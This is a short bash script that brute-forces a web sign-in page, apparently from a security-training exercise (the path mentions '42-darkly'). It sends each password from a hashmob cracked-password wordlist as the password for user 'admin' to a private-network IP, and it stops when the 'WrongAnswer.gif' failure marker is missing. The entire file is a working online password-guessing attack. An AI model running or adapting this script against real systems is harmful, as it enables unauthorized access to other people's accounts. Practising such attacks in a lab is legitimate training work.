#!/bin/bash
IP="192.168.56.107"
USER="admin"
FAIL="WrongAnswer.gif"         

while read -r pass; do
    resp=$(curl -s "http://$IP/?page=signin&username=$USER&password=$pass&Login=Login")
    if ! echo "$resp" | grep -qi "$FAIL" ; then
        echo "FOUND : $pass"
        break
    fi
done < /home/abey/42/42-darkly/hashmob.net_2025.small.found/hashmob.net_2025.small.found